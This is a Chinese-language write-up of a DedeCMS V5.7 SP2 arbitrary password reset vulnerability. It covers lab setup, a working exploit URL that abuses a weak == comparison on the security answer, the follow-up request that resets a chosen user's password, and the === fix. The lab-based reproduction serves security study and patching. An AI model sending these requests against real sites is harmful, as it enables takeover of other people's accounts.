**声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本团队无关。请遵守《中华人民共和国网络安全法》。**

### 一.漏洞简介

织梦内容管理系统（DeDeCMS）以其简单、实用、开源的特点而著名。作为国内最知名的PHP开源网站管理系统，它在多年的发展中取得了显著进步，无论在功能还是易用性方面都有长足的发展。该系统广泛应用于中小型企业门户网站、个人网站、企业和学习网站建设。在中国，DedeCMS被认为是最受欢迎的CMS系统之一。但是，最近发现该系统的一个漏洞位于member/resetpassword.php文件中。由于未对接收的参数safeanswer进行严格的类型判断，攻击者可以利用弱类型比较来绕过安全措施。

### 二.漏洞原理

DeDecms
V5.7SP2正式版存在一个未修复的漏洞，允许任意用户密码重置。漏洞位于member/resetpassword.php文件中，因未对传入的参数safeanswer进行严格类型检查，导致可使用弱类型比较绕过。在代码分析中，当$dopost等于safequestion时，通过传入的$mid查询用户信息，判断安全问题和答案是否匹配。由于使用
== 而不是 ===，可绕过判断。当安全问题值为0，答案值为空，经过弱类型处理后仍可通过判断。

### 三.使用工具

Burp Suite,PHPStudyPro，VMware

### 四.靶场搭建

织梦CMS V5.7PS2靶场蓝奏云下载：https://wwti.lanzouj.com/iQirO15gp8fg

##### 将解压好的靶场放在PHPStudy的WWW目录下

![image](https://image.3001.net/images/20230816/1692181951_64dca5bf20a5bc51b0647.png!small)

##### 访问http://ip/DedeCMS-V5.7-UTF8-SP2/uploads/进行安装（直接继续）

![image](https://image.3001.net/images/20230816/1692181982_64dca5de9ceac2438eb0a.png!small)![image](https://image.3001.net/images/20230816/1692181990_64dca5e697e89218c55ad.png!small)![image](https://image.3001.net/images/20230816/1692181997_64dca5ed6c338696fc892.png!small)

##### 进入管理界面进行配置

![image](https://image.3001.net/images/20230816/1692182017_64dca601bc767fe841dc5.png!small)![image](https://image.3001.net/images/20230816/1692182023_64dca607dd21414637ae1.png!small)

### 五.漏洞复现

##### 首先注册两个测试账号，以用户名作为密码

![image](https://image.3001.net/images/20230816/1692182037_64dca615951a77c7bfc2e.png!small)![image](https://image.3001.net/images/20230816/1692182044_64dca61c583c460e3086c.png!small)

#####
直接使用浏览器访问payload（`http://ip/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3`）并抓包获取id=3的账号的key(账号：HengMengTest)

![image](https://image.3001.net/images/20230816/1692182057_64dca629b76d4a8cc178e.png!small)

#####
获得key后再访问http://ip/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&id=3&key=x1ZAUMPg会直接跳转到修改密码界面

![image](https://image.3001.net/images/20230816/1692182115_64dca663d6687a2d15fed.png!small)![image](https://image.3001.net/images/20230816/1692182149_64dca685737cbf886d50e.png!small)

##### 将密码修改为HengMeng（与账号HengMeng密码一致）修改成功

![image](https://image.3001.net/images/20230816/1692182162_64dca6928d311d09c73f8.png!small)![image](https://image.3001.net/images/20230816/1692182169_64dca69940ca70de5f8ac.png!small)

##### 密码修改成成功，漏洞复现完成

![image](https://image.3001.net/images/20230816/1692182179_64dca6a38b2e0db869375.png!small)

### 六.防御策略

##### 针对上面 DeDecms任意用户密码重置 漏洞，我们只需要使用 === 来代替 == 就行了。因为 ===
操作会同时判断左右两边的值和数据类型是否相等，若有一个不等，即返回 false
。具体修复代码如下：![image](https://image.3001.net/images/20230816/1692182281_64dca7094f4a64df53723.png!small)

  

